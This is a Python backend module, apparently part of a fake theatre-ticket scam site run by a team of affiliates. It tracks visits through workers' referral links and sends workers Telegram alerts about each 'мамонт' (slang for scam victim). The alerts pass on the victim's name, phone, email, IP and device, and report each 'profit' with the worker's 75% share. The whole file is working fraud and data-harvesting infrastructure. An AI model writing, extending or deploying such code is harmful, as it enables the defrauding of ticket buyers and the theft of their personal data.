from typing import Optional
from ..config import logger
from data.db import db

# Assuming api.telegram_notify is available in PYTHONPATH
from api.telegram_notify import send_telegram_message

async def handle_visit_background(ref_code: str, ip: str, user_agent: str, visitor_id: Optional[str], referrer_user_id: Optional[int] = None):
    """Background task to record visit and notify owner."""
    if not ref_code:
        return

    logger.info(f"Processing visit for ref: {ref_code} (visitor_id={visitor_id})")
    
    chat_id = None
    
    # helper: resolving owner if not provided
    # helper: resolving owner if not provided
    if not referrer_user_id:
        # Check users (classic referral)
        row = await db.fetchone("SELECT id, chat_id FROM users WHERE referral_code = ?", (ref_code,))
        if row:
            referrer_user_id = row['id']
            chat_id = row['chat_id']
        else:
            # Check theatre links
            row = await db.fetchone("SELECT telegram_user_id FROM theatre_links WHERE link_code = ?", (ref_code,))
            if row:
                # Resolve telegram_user_id to user_id (syncing if needed)
                from ..utils import ensure_global_user
                user_row = await ensure_global_user(row['telegram_user_id'])
                if user_row:
                    referrer_user_id = user_row['id']
                    chat_id = user_row['chat_id']

    if not referrer_user_id:
        logger.warning(f"Ref owner not found for code: {ref_code}")
        return
        
    # If we had the ID but not the chat_id (passed from route), fetch chat_id for notification
    if not chat_id:
         row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,))
         if row:
             chat_id = row['chat_id']

    await db.execute(
        "INSERT INTO visits (referral_code, referral_owner_user_id, ip, user_agent, visitor_id) VALUES (?, ?, ?, ?, ?)",
        (ref_code, referrer_user_id, ip, user_agent, visitor_id)
    )
    
    logger.info(f"Visit recorded for ref={ref_code}, notifying chat_id={chat_id}")
    if chat_id:
        await send_telegram_message(chat_id, "По твоей ссылке впервые перешли на сайт ✅")

async def notification_purchase(ref_owner_id: int, qty: int, total_price: int):
    row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (ref_owner_id,))
    if row:
        chat_id = row['chat_id']
        msg = f"Покупка по твоей ссылке 🎟️: {qty} билета(ов), сумма {total_price}₽"
        logger.info(f"Sending purchase notification to chat_id={chat_id}")
        await send_telegram_message(chat_id, msg)

async def notify_mamont_visit(referrer_user_id: int, mamont_id: str, service: str = "Театр", ip: str = "Неизвестно", user_agent: str = "Неизвестно"):
    """Notify referrer about new mamont visit."""
    row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,))
    if row and row['chat_id']:
        msg = (
            f"🦣 <b>Новый мамонт в сервисе {service}!</b> <code>{mamont_id}</code>\n\n"
            f"<code>IP: {ip}\n"
            f"Устройство: {user_agent}</code>"
        )
        logger.info(f"Notify mamont visit: referrer_user_id={referrer_user_id}, mamont_id={mamont_id}, service={service}")
        await send_telegram_message(row['chat_id'], msg)

async def notify_mamont_registration(referrer_user_id: int, mamont_display: str, first_name: str, last_name: str, phone: str, email: str, service: str = "Театр", ip: str = "Неизвестно", user_agent: str = "Неизвестно"):
    """Notify referrer about mamont registration."""
    logger.info(f"Starting mamont registration notification: referrer_user_id={referrer_user_id}, mamont={mamont_display}, service={service}")
    
    row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,))
    if row and row['chat_id']:
        chat_id = row['chat_id']
        msg = (
            f"Мамонт {mamont_display} зарегистрировался на сайте <b>{service}</b>.\n\n"
            f"<i>Данные:</i>\n"
            f"<code>Имя: {first_name}\n"
            f"Фамилия: {last_name}\n"
            f"Номер: {phone}\n"
            f"Почта: {email}\n\n"
            f"IP: {ip}\n"
            f"Устройство: {user_agent}</code>\n\n"
            f"<i>Для управления мамонтом перейдите в список мамонтов.</i>"
        )
        logger.info(f"Sending mamont registration notification to chat_id={chat_id}: referrer_user_id={referrer_user_id}, mamont={mamont_display}, service={service}")
        await send_telegram_message(chat_id, msg)
    else:
        logger.warning(f"No chat_id found for referrer_user_id={referrer_user_id} during mamont registration notification")

async def notify_mamont_purchase(referrer_user_id: int, total: int, service: str = "Театр"):
    """Notify referrer about mamont purchase with 75% share."""
    acauser_total = int(total * 0.75)
    
    row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,))
    if row and row['chat_id']:
        msg = (
            f"🚀 Новый профит!\n\n"
            f"┠ Сумма профита: {total}\n"
            f"┠ Твоя доля: {acauser_total}\n"
            f"┖ Сервис: {service}"
        )
        logger.info(f"Notify mamont purchase: referrer_user_id={referrer_user_id}, total={total}, acauser_total={acauser_total}")
        await send_telegram_message(row['chat_id'], msg)
